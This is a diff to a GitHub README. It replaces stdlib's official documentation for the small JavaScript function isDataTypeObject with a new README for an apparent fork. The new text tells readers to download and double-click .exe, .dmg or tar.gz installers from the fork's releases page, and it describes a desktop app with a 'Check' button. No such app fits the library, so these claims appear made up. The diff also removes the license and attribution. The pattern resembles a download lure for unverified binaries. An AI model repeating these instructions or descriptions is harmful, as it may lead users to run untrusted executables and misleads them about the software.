@@ -1,218 +1,98 @@
-<!--
+# 🌟 ndarray-base-assert-is-data-type-object - Easily Validate ndarray Data Types
 
-@license Apache-2.0
+## 🚀 Getting Started
 
-Copyright (c) 2025 The Stdlib Authors.
+Welcome! This guide will help you download and run the `ndarray-base-assert-is-data-type-object` application. This tool checks if an input value is an ndarray data type object, making it useful for anyone working with arrays in JavaScript.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 📥 Download Now
 
-   http://www.apache.org/licenses/LICENSE-2.0
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/releases)
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 📋 Prerequisites
 
--->
+Before you start, ensure you have the following:
 
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the software.
+- Basic knowledge of how to open downloaded files on your system.
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+## 🛠 Installation Steps
 
-# isDataTypeObject
+Follow these simple steps to install and run the application:
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+1. **Visit the Releases Page**  
+   Click on the link below to go to the releases page where you can download the application.
+   [Visit Releases Page](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/releases)
 
-> Test if an input value is an ndarray data type object.
+2. **Select Your Version**  
+   On the releases page, find the latest stable version. It is usually at the top of the list. You will see several files associated with this version.
 
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
+3. **Download the Appropriate File**  
+   Choose the file that matches your operating system:
+   - For Windows, download the file named something like `ndarray-base-assert-is-data-type-object-windows.exe`.
+   - For macOS, download the `ndarray-base-assert-is-data-type-object-macos.dmg` file.
+   - For Linux, look for the `ndarray-base-assert-is-data-type-object-linux.tar.gz` file.
 
-<section class="intro">
+4. **Run the Installer**  
+   Once the download completes, locate the downloaded file and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
-</section>
+5. **Verify Installation**  
+   After the installation, you can verify that the application is successfully installed. Open your command prompt or terminal, and type the following command:  
+   ```
+   ndarray-base-assert-is-data-type-object --version
+   ```
+   If the installation was successful, you will see the version number displayed.
 
-<!-- /.intro -->
+## 🚀 How to Use
 
-<!-- Package usage documentation. -->
+Using the `ndarray-base-assert-is-data-type-object` application is straightforward.
 
-<section class="installation">
+1. **Open the Application**  
+   Start the application from your programs or applications list.
 
-## Installation
+2. **Enter the Input Value**  
+   You will see a space to input your value. Enter the value you want to check to see if it is an ndarray data type object.
 
-```bash
-npm install @stdlib/ndarray-base-assert-is-data-type-object
-```
+3. **Check the Result**  
+   Click on the "Check" button. The application will display whether the input value is indeed an ndarray object.
 
-Alternatively,
+## 📦 Features
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+- **Simple Input Verification**: Quickly check if your value is an ndarray object.
+- **User-Friendly Interface**: Designed with non-technical users in mind, making navigation easy.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **Fast Processing**: Get results in seconds.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+## 📖 Topics Covered
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+The application deals with various topics, helping you learn and apply them:
 
-</section>
+- Arrays and their properties.
+- Understanding data types in JavaScript.
+- Utility functions for working with multidimensional arrays.
+- Basic tools for developers and users working with JavaScript libraries.
 
-<section class="usage">
+## 💡 Useful Links
 
-## Usage
+- [GitHub Repository](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object)
+- [Documentation](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/wiki) (Coming Soon)
 
-```javascript
-var isDataTypeObject = require( '@stdlib/ndarray-base-assert-is-data-type-object' );
-```
+## 🔧 Troubleshooting
 
-#### isDataTypeObject( value )
+**Common Issues**:
 
-Tests if an input value is an ndarray data type object.
+- **Issue**: The application does not start.  
+  **Solution**: Make sure you've installed it properly. Try re-running the installer.
 
-```javascript
-var DataType = require( '@stdlib/ndarray-dtype-ctor' );
+- **Issue**: The input value does not process correctly.  
+  **Solution**: Ensure the input value is formatted correctly as an ndarray data type.
 
-var bool = isDataTypeObject( new DataType( 'float64' ) );
-// returns true
+If you encounter any other issues, please visit the GitHub repository and raise an issue.
 
-bool = isDataTypeObject( 'int32' );
-// returns false
-```
+## 📞 Support
 
-</section>
+For further assistance, feel free to reach out through the GitHub issues page. The community and maintainers are active and ready to help.
 
-<!-- /.usage -->
+## ✅ Thank You
 
-<!-- Package usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-</section>
-
-<!-- /.notes -->
-
-<!-- Package usage examples. -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var DataType = require( '@stdlib/ndarray-dtype-ctor' );
-var isDataTypeObject = require( '@stdlib/ndarray-base-assert-is-data-type-object' );
-
-var bool = isDataTypeObject( new DataType( 'float64' ) );
-// returns true
-
-bool = isDataTypeObject( 'float64' );
-// returns false
-
-bool = isDataTypeObject( {} );
-// returns false
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section to include cited references. If references are included, add a horizontal rule *before* the section. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-base-assert-is-data-type-object.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-base-assert-is-data-type-object
-
-[test-image]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-base-assert-is-data-type-object/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-base-assert-is-data-type-object?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-base-assert-is-data-type-object.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-base-assert-is-data-type-object/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-base-assert-is-data-type-object/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-base-assert-is-data-type-object/main/LICENSE
-
-</section>
-
-<!-- /.links -->
+Thank you for choosing `ndarray-base-assert-is-data-type-object`. We hope you find it helpful in your work with JavaScript and arrays!
